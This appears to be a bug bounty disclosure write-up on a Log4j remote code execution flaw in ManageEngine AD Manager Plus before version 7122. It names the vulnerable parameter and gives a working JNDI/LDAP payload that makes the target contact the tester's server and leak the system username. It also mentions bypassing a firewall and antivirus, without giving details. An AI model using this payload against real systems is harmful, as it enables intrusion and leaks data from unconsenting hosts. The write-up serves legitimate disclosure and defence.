# AD manager Plus log4j remote code execution affected before version 7122

### Description

In the summer of 2022, I have been doing security engagement on Synack Red Team in the collaboration with my good friend (Thura Moe Myint). At that time, Log4j was already widespread on the internet. Manage Engine had already patched the Ad Manager Plus to prevent it from being affected by the Log4j vulnerability. They had mentioned that Log4j was not affected by Ad Manager Plus. However, we determined that the Ad Manager Plus was running on our target and managed to exploit the Log4j vulnerability.

### Exploitation

First, Let’s make a login request using  proxy.

![](https://raw.githubusercontent.com/channyein1337/research/main/images/admanager.png)

Inject the following payload in the ```methodToCall``` parameter in the ```ADSearch.cc``` request.

```
${jndi:ldap://${sys:user.name}.<your-server>}
```

![](https://raw.githubusercontent.com/channyein1337/research/main/images/burp_request.png)

Then you will get the dns callback with username in your burp collabrator.

![](https://raw.githubusercontent.com/channyein1337/research/main/images/username.png)

POC Of Achieving Full RCE

![](https://raw.githubusercontent.com/channyein1337/research/main/images/poc.png)


### Notes

When we initially reported this vulnerability to Synack, we only managed to get a DNS callback and our report was marked as LDAP injection. However, we attempted to gain full RCE on the host but were not successful. Later, we discovered that Ad Manager Plus was running on another target, so we tried to get full RCE on that target. We realized that there was a firewall and an anti-virus running on the machine, so most of our payloads wouldn't work. After spending a considerable amount of time , we eventually managed to  bypass the firewall and anti-virus, and achieve full RCE.

### Conclusion

We had already informed Zoho about the log4j vulnerability, and even after it was fixed, they decided to reward us with a bonus bounty for our report. 

### Mitigation

Updating to a version of Ad Manager Plus higher than 7122 should resolve the issue.
